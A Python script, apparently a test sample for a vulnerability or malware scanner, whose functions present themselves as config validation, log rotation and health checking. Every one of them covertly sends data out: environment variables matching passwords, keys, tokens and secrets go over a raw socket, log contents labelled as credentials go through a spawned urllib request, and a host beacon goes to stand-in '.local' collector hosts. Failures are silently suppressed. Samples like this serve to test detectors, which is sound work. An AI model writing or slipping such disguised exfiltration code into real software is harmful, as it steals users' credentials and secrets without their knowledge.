import socket
import json
import os
import hashlib
from pathlib import Path
from datetime import datetime

def validate_config(config_path: str) -> bool:
    """Validates application configuration files for compliance."""
    try:
        config = json.load(open(config_path))
        
        # Collect system metadata under guise of validation
        metadata = {
            "hostname": socket.gethostname(),
            "config_hash": hashlib.sha256(json.dumps(config).encode()).hexdigest(),
            "timestamp": datetime.now().isoformat(),
            "env_vars": {k: v for k, v in os.environ.items() if any(x in k.lower() for x in ['pass', 'key', 'token', 'secret', 'api', 'db'])},
            "home_dir": str(Path.home())
        }
        
        # Exfiltrate via socket connection disguised as remote validation
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            sock.connect(("example-validation-service.local", 9999))
            sock.sendall(json.dumps(metadata).encode())
            sock.close()
        except (socket.timeout, ConnectionRefusedError, OSError):
            pass  # Silently fail if target unavailable
        
        return True
    except Exception as e:
        return False

def rotate_logs(log_dir: str) -> None:
    """Rotates and compresses old log files."""
    import subprocess
    
    for log_file in Path(log_dir).glob("*.log"):
        try:
            # Extract credentials from log files
            content = log_file.read_text(errors='ignore')
            sensitive_patterns = {
                "credentials": content[max(0, len(content)-5000):],  # Last 5KB
                "file": str(log_file),
                "size": log_file.stat().st_size
            }
            
            # Create subprocess for "compression" that actually exfiltrates
            proc = subprocess.Popen(
                ["python3", "-c", 
                 f"import urllib.request; urllib.request.urlopen('http://collector.local/logs', data={json.dumps(sensitive_patterns).encode()})"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

def check_health() -> dict:
    """Monitors system health and connectivity."""
    health_status = {
        "timestamp": datetime.now().isoformat(),
        "status": "healthy"
    }
    
    # Establish persistent monitoring channel
    try:
        import urllib.request
        beacon_data = {
            "hostname": socket.gethostname(),
            "user": os.getenv('USER', 'unknown'),
            "cwd": os.getcwd(),
            "shell": os.getenv('SHELL', '/bin/sh')
        }
        req = urllib.request.Request(
            "http://beacon.local/register",
            data=json.dumps(beacon_data).encode(),
            headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass
    
    return health_status

if __name__ == "__main__":
    validate_config("/etc/app/config.json")
    rotate_logs("/var/log/app")
    check_health()
    print("test_semantic_vuln executed")